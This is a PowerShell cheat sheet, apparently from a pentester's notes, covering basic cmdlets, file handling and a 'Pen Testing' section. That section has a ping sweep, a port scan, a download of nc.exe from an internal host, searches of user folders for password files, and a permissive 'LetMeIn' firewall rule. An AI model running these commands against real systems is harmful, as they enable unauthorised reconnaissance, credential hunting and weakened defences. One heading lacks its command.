# Powershell

### Style

{% embed url="https://github.com/PoshCode/PowerShellPracticeAndStyle" %}

### Basics

```text
set-ExecutionPolicy unrestricted
```

Verbs

```text
- New- Creates a new resource
- Set- Modifies an existing resource
- Get- Retrieves an existing resource
- Read- Gets information from a source, such as a file
- Find- Used to look for an object
- Search- Used to create a reference to a resource
- Start- (asynchronous) begin an operation, such as starting a process
- Invoke- (synchronous) perform an operation, such as running a command
```

Piping cmdlet output to another cmdlet:

```text
Get-Process | Format-List –property name
```

ForEach-Object in the pipeline \(alias %\):

```text
PS C:\> ls *.txt | ForEach-Object {cat $_}
```

Where-Object condition \(alias where or ?\):

```text
Get-Process | Where-Object {$_.name –eq "notepad"}
```

```text
#Generating ranges of numbers and looping:
1..10 | % {echo "Hello!"}

#Creating and listing variables:
$var = 42
ls variable:

#Examples of passing cmdlet output down pipeline:

dir | group extension | sort

Get-Service dhcp | Stop-Service -PassThru | Set-Service -StartupType Disabled
```

### Files

```text
#Get a directory listing (ls, dir, gci):
Get-ChildItem

#Copy a file (cp, copy, cpi):
Copy-Item src.txt dst.txt

#Move a file (mv, move, mi):
Move-Item src.txt dst.txt

#Find text within a file:
Select-String –path c:\users\*.txt –pattern password
ls -r c:\users -file | %{Select-String -path $_ -pattern password}

#Display file contents (cat, type, gc):
Get-Content file.txt

#Get present directory (pwd, gl):
Get-Location

#Get a process listing (ps, gps):
Get-Process

#Get a service listing:
Get-Service

#Formatting output of a command (Format-List):
ls | Format-List –property name

#Paginating output:
ls –r | Out-Host -paging

#Exporting output to CSV:
Get-Process | Export-Csv procs.csv
```

### Pen Testing

```text
#Conduct a ping sweep:
1..255 | % {echo "10.10.10.$_"; ping -n 1 -w 100 10.10.10.$_ | Select-String ttl}

#Conduct a port scan:
1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.10.10.10",$_)) "Port $_ is open!"} 2>$null

#Fetch a file via HTTP (wget in PowerShell):
(New-Object System.Net.WebClient).DownloadFile("http://10.10.10.10/nc.exe","nc.exe")

#Find all files with a particular name:
Get-ChildItem "C:\Users\" -recurse -include *passwords*.txt

#Get a listing of all installed Microsoft Hotfixes:
Get-HotFix

#Navigate the Windows registry:
cd HKLM:\
HKLM:\> ls

#List programs set to start automatically in the registry:
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\run

#Convert string from ascii to Base64:
#List and modify the Windows firewall rules:
Get-NetFirewallRule –all
New-NetFirewallRule -Action
Allow -DisplayName LetMeIn -RemoteAddress 10.10.10.25
```

